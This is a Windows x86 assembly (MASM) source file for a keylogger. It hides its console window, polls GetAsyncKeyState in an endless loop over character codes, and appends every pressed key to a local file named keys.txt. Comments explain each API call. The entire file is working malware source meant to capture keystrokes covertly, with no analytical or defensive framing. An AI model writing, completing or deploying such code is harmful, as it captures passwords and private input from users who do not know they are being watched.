.model flat, stdcall
option casemap:none
include windows.inc
include kernel32.inc
include user32.inc
includelib kernel32.lib
includelib user32.lib

.data
    fileName db "keys.txt", 0
    buffer db 255 dup(?)
    bytesWritten DWORD ?
    c2 BYTE ?

.code
start:
    ; Hide the console window
    invoke GetConsoleWindow
    invoke ShowWindow, eax, SW_HIDE

    ; Start logging keystrokes
    call startLogging

    ; Exit the program
    invoke ExitProcess, 0

startLogging proc
    LOCAL key:DWORD
    LOCAL char:BYTE

    ; Initialize c outside the loop
    mov c2, 0

    ; Infinite loop
    L1:
        ; Loop through ASCII characters (0 to 254)
    L2:
        ; Check if the key is pressed
        movzx eax, c2  ; Zero-extend c2 to DWORD
        mov key, eax  ; Store the key value
        invoke GetAsyncKeyState, key        ; to check if the key is currently being pressed
        test eax, eax
        jz L3                               ; key is not pressed at the moment of the check

        ; Open the log file
        invoke CreateFile, ADDR fileName, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL
        ; |name of file| |object is to be opened with write access| |other processes can open the object for reading it is open|
        ; |No security attributes are applied, and the handle cannot be inherited| |open the file if it exists or create it if it doesn't|
        ; | The file does not have other attributes like `hidden` or `ReadOnly`| |No template file is used|
        mov ebx, eax

        ; Move file pointer to end of file
        invoke SetFilePointer, ebx, 0, NULL, FILE_END       ;  used to move the file pointer of an open file to a specified position
        ; |This is the file handle returned by CreateFile. It identifies the open file for which the file pointer is to be moved.|
        ; |the file pointer will be moved relative to the position specified by the last parameter (in this case, FILE_END|
        ; |file pointer is moved to a new position|

        ; Write the character to the file
        movzx eax, c2  ; Zero-extend c2 to DWORD
        mov buffer, al  ; Move the low byte of eax (char) to buffer
        invoke WriteFile, ebx, ADDR buffer, 1, ADDR bytesWritten, NULL
        ; | ebx: This is the file handle, which refers to the file where the data will be written|
        ; | This is the address of the buffer that contains the data to be written to the file | 
        ; |  indicates that only one byte of data from the buffer should be written to the file |

        ; Close the file
        invoke CloseHandle, ebx
        invoke Sleep, 150
    L3:
        ; Increment character
        inc c2
        cmp c2, 255
        jle L2

    jmp L1

    ; Add a return statement to the procedure
    ret

startLogging endp

end start